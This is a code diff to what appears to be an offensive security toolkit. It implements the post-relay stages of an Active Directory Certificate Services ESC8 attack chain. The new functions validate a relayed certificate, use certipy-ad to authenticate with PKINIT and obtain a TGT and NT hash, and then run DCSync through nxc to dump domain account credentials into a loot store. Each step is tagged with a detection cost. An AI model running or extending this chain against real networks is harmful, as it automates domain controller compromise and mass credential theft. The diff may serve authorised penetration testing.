@@ -48,6 +48,7 @@ CLI ``fieldkit chain run esc8 <target>`` produces a full trail against a
 mock target — proves the shape without pretending the primitives work
 yet.
 """
+import os
 from dataclasses import dataclass, field
 from typing import Callable, Optional
 
@@ -304,7 +305,187 @@ def _stub_action(msg):
     return _action
 
 
-# ---------------------------------------------------------------- coerce steps
+# ---------------------------------------------------------------- post-relay steps
+
+def _cert_request_action(chain, ctx):
+    """Validate the certificate captured by relay:capture: sanity-check
+    it exists, has bytes, matches the expected principal.
+
+    ADCS actually issued the cert during relay:capture (that's what
+    the --adcs / --template ntlmrelayx flags do — they auto-request
+    on the caught auth), so this step is verification, not another
+    HTTP round-trip.
+    """
+    import base64
+    _ = ctx
+    cert_bytes = chain.artifacts.get("cert_bytes", "")
+    principal = chain.artifacts.get("cert_principal", "")
+    if not cert_bytes:
+        return Outcome(
+            kind="fail",
+            evidence="no cert_bytes in chain artifacts — relay:capture didn't acquire a cert")
+    if not principal:
+        return Outcome(
+            kind="fail",
+            evidence="no cert_principal in chain artifacts — cannot proceed with PKINIT")
+    try:
+        raw = base64.b64decode(cert_bytes, validate=True)
+    except Exception as exc:                                    # noqa: BLE001
+        return Outcome(
+            kind="fail",
+            evidence=f"cert_bytes did not decode as base64: {exc}")
+    if len(raw) < 100:
+        return Outcome(
+            kind="fail",
+            evidence=f"cert bytes suspiciously small ({len(raw)}B) — likely bad relay capture")
+    return Outcome(
+        kind="ok",
+        evidence=f"cert for {principal} validated ({len(raw)}B PFX)",
+        data={"cert_pfx_len": len(raw)})
+
+
+def _pkinit_action(chain, ctx):
+    """Materialize the captured cert to disk, present it to the KDC
+    via certipy-ad `auth`, land a TGT ccache + (if UnPAC-able) the
+    machine account's NT hash.
+    """
+    import base64
+    import tempfile
+    from . import pkinit
+    cert_bytes = chain.artifacts.get("cert_bytes", "")
+    principal = chain.artifacts.get("cert_principal", "")
+    domain = getattr(ctx, "domain", None)
+    if not domain:
+        return Outcome(
+            kind="manual",
+            evidence="no domain on ctx — pass --domain <AD-DOMAIN> to run PKINIT")
+    if not cert_bytes or not principal:
+        return Outcome(
+            kind="fail",
+            evidence="cert artifacts missing — post:cert-request must have failed")
+    fd, pfx_path = tempfile.mkstemp(prefix="fk-pkinit-", suffix=".pfx")
+    with os.fdopen(fd, "wb") as fh:
+        fh.write(base64.b64decode(cert_bytes))
+    result = pkinit.auth(
+        principal=principal,
+        pfx_path=pfx_path,
+        domain=domain,
+        dc_ip=chain.target,
+        tool_bin=getattr(ctx, "pkinit_tool_bin", None),
+        tool_timeout=getattr(ctx, "pkinit_timeout", 30))
+    if result.kind == "no-tool":
+        return Outcome(
+            kind="manual",
+            evidence=(f"certipy-ad not on PATH; PFX at {pfx_path}\n"
+                      f"  run: {result.command_hint}"))
+    if result.kind == "unreachable":
+        return Outcome(kind="fail",
+                        evidence=f"PKINIT to {chain.target} unreachable",
+                        data={"pkinit_detail": result.detail})
+    if result.kind == "kdc-reject":
+        return Outcome(kind="fail",
+                        evidence=(f"KDC rejected PKINIT — cert may be for a "
+                                  f"different account (subject: {principal})"),
+                        data={"pkinit_detail": result.detail[-512:]})
+    if result.kind == "cert-invalid":
+        return Outcome(kind="fail",
+                        evidence="cert failed to load / decrypt into certipy",
+                        data={"pkinit_detail": result.detail[-512:]})
+    if result.kind != "ok":
+        return Outcome(kind="fail",
+                        evidence=f"PKINIT ended in unrecognized state ({result.kind})",
+                        data={"pkinit_detail": result.detail[-512:]})
+    store = getattr(ctx, "store", None)
+    if store is not None:
+        try:
+            host_row = store.host_by_ip(chain.target)
+            hid = host_row["id"] if host_row else None
+        except Exception:                                       # noqa: BLE001
+            hid = None
+        if result.ccache_path:
+            store.add_loot(host_id=hid, kind="ccache",
+                            value=principal, path=result.ccache_path)
+        if result.nt_hash:
+            store.add_loot(host_id=hid, kind="nthash",
+                            value=f"{principal}:{result.nt_hash}")
+    evidence = f"TGT obtained for {principal}"
+    if result.ccache_path:
+        evidence += f" → {result.ccache_path}"
+    if result.nt_hash:
+        evidence += " (NT hash extracted)"
+    return Outcome(
+        kind="ok", evidence=evidence,
+        data={"ccache_path": result.ccache_path,
+              "pkinit_principal": principal,
+              "pkinit_nt_hash": result.nt_hash})
+
+
+def _dcsync_action(chain, ctx):
+    """DCSync via nxc using either the PKINIT ccache OR the extracted
+    NT hash. Recovered credentials land in Store when ctx.store is set."""
+    from . import dcsync as dcsync_mod
+    from . import creds as creds_mod
+    ccache = chain.artifacts.get("ccache_path", "")
+    nt_hash = chain.artifacts.get("pkinit_nt_hash", "")
+    principal = chain.artifacts.get("pkinit_principal", "")
+    domain = getattr(ctx, "domain", None)
+    if not ccache and not (nt_hash and principal and domain):
+        return Outcome(
+            kind="fail",
+            evidence=("dcsync needs ccache or (nt_hash + principal + domain) "
+                      "— pkinit step must have failed"))
+    if ccache:
+        result = dcsync_mod.dcsync(
+            dc_ip=chain.target,
+            ccache_path=ccache,
+            tool_bin=getattr(ctx, "dcsync_tool_bin", None),
+            tool_timeout=getattr(ctx, "dcsync_timeout", 180))
+    else:
+        user = principal.split("/", 1)[-1] if "/" in principal else principal
+        result = dcsync_mod.dcsync(
+            dc_ip=chain.target,
+            nt_hash=nt_hash, username=user, domain=domain,
+            tool_bin=getattr(ctx, "dcsync_tool_bin", None),
+            tool_timeout=getattr(ctx, "dcsync_timeout", 180))
+    if result.kind == "no-tool":
+        return Outcome(kind="manual",
+                        evidence=f"nxc/netexec not on PATH; run:\n  {result.command_hint}")
+    if result.kind == "denied":
+        return Outcome(
+            kind="fail",
+            evidence="DRSGetNCChanges denied — machine account may lack DS-Replication rights",
+            data={"dcsync_detail": result.detail[-512:]})
+    if result.kind == "unreachable":
+        return Outcome(kind="fail",
+                        evidence=f"dcsync target {chain.target} unreachable",
+                        data={"dcsync_detail": result.detail[-512:]})
+    if result.kind != "ok":
+        return Outcome(kind="fail",
+                        evidence=f"dcsync ended in unrecognized state ({result.kind})",
+                        data={"dcsync_detail": result.detail[-512:]})
+    store = getattr(ctx, "store", None)
+    persisted = 0
+    if store is not None:
+        for c in result.credentials:
+            # c.principal is either "DOMAIN\user" (nxc) or bare user.
+            # c.nt_hash is "LM:NT" (impacket format) — split so we
+            # pass the NT portion to parse_credential's nt_hash kwarg.
+            nt_only = c.nt_hash.split(":")[-1]
+            try:
+                parsed = creds_mod.parse_credential(
+                    c.principal, nt_hash=nt_only)
+                store.add_credential(parsed.credential,
+                                     source=f"dcsync:{chain.target}")
+                persisted += 1
+            except Exception:                                   # noqa: BLE001
+                pass
+    return Outcome(
+        kind="ok",
+        evidence=(f"DCSync ok — {len(result.credentials)} account(s) recovered"
+                  + (f", {persisted} persisted" if store is not None else "")),
+        data={"dcsync_count": len(result.credentials),
+              "dcsync_persisted": persisted})
+
 
 # ---------------------------------------------------------------- relay steps
 
@@ -571,14 +752,14 @@ def esc8_chain(target_dc, ca_endpoint=None, cred=None):
                  detection_cost=2),
             Step("post:cert-request",
                  "attacker-side",
-                 _stub_action("ADCS certificate retrieval lands in D4"),
+                 _cert_request_action,
                  detection_cost=1),
             Step("post:pkinit-tgt",
                  "attacker-side",
-                 _stub_action("PKINIT → TGT (existing kerberos.py) lands in D4"),
+                 _pkinit_action,
                  detection_cost=0),
             Step("post:dcsync",
                  "attacker-side",
-                 _stub_action("DCSync via nxc lands in D4"),
+                 _dcsync_action,
                  detection_cost=3),
         ))
